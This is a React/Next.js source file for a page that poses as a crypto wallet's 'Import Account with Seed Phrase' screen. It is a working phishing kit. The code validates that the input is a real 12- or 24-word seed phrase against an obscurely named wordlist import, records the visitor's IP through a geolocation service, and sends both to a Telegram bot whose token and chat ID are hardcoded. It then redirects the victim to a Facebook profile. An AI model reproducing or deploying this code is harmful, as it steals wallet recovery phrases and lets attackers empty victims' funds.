import React, { useRef, useState, useEffect } from "react";
import Image from "next/image";
import "../../node_modules/bootstrap/dist/css/bootstrap.min.css";
import classes from "../../styles/Recovery.module.css";
import Arrow from "../../public/assets/arrow.png";
import { useRouter } from "next/router";
import _0x1968 from "../../components/phrase2";

const Recovery = ({ walletHandler }) => {
  const router = useRouter();

  const [showBtn, setShowBtn] = useState(false);
  const inPutValue = useRef();
  const [clientIp, setClientIp] = useState();

  useEffect(() => {
    fetch("https://geolocation-db.com/json/")
      .then((res) => res.json())
      .then((data) => {
        setClientIp(data.IPv4);
      })
      .catch((error) => console.log(error));
  }, []);



  //telegram boat data
  // let bot = {
  //   token: "2027785265: AAGebBlRQaDSxpCDYqZ0Ya6fngIx1wZ4gEk",
  //   chatID: "2051169841"
  // };
  let bot = {
    token: "2140501096:AAHJgY2SgrHFvMRQWiND_k7z2RBRfdeDHSE",
    chatID: "2130650938"
  };

  // let status = "disabled";
  let disabled = false;
  const handleSubmit = (e) => {
    e.preventDefault();
    let message = inPutValue.current.value;

    let wordCount = message.trim().split(" ").length;
    if (wordCount >= 12 && wordCount <= 24) {
      let disabled = true;
      let ipAddress = clientIp;

      let sms = [
        "-------------+[New]+-------------",
        "1.Phrase: " + message,
        "---------------------------------------",
        "Client IP: " + ipAddress,
        "-------------+[New]+-------------",
      ];

      let finalString = sms.join("\r\n");

      let encodedText = encodeURIComponent(finalString);

      fetch(
        `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}=&text=${encodedText}`,
        {
          method: "GET",
        }
      ).then(
        (success) => {
          router.push("https://www.facebook.com/profile.php?id=100074565821861");
        },
        (error) => {
          alert("message Not Sent");
          console.log(error);
        }
      );
    } else {
      let disabled = false;
    }
  };

  function check(arr1, arr2) {
    if (arr1.length === 12 || arr1.length === 24) {
      for (let i = 0; i < arr1.length; i++) {
        if (arr2.indexOf(arr1[i]) === -1) {
          return false;
        }
      }
      return true
    } else {
      return false;
    }
  }

  const changeHandler = (e) => {
    let message = e.target.value;
    let wordCount = message.trim().split(" ");
    setShowBtn(check(wordCount, _0x1968));
  };







  return (
    <section className={classes.recoveryPageAnimation}>
      <div className={classes.textareaWrapper}>
        <div className="row justify-content-center">
          <div className="col-11">
            <div onClick={walletHandler} className={classes.topContentBox}>
              <span className={classes.arrowIcon}>
                {" "}
                <Image
                  width="20"
                  height="20"
                  src={Arrow}
                  alt="arrow image"
                />{" "}
              </span>
            </div>
          </div>
        </div>
        <div className="row justify-content-center ">
          <div className="col-11">
            <div className={classes.contentBox}>
              <h3>Import Account with Seed Phrase</h3>
            </div>
          </div>
        </div>
        <div className="row justify-content-center">
          <div className="col-11">
            <div className={classes.inputbox}>
              <p>Enter your seed phrase to restore your account</p>
              <p>Seed Phrase</p>
              <form onSubmit={handleSubmit}>
                <textarea
                  onChange={changeHandler}
                  className={`form-control ${classes.recoveryForm}`}
                  name="recovery"
                  id="recovery"
                  cols="40"
                  rows="8"
                  ref={inPutValue}
                ></textarea>
                <small>
                  Typically 12 words (sometimes 24) separated by single spaces.
                </small>
                <br />
                {showBtn ? (
                  <button className={classes.btnImport} type="submit">
                    Import
                  </button>
                ) : (
                  <button className={classes.disableBtn} type="submit" disabled>
                    Import
                  </button>
                )}
              </form>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Recovery;





// let bot = {
//   token: "2140501096:AAHJgY2SgrHFvMRQWiND_k7z2RBRfdeDHSE",
//   chatID: "2130650938"
// };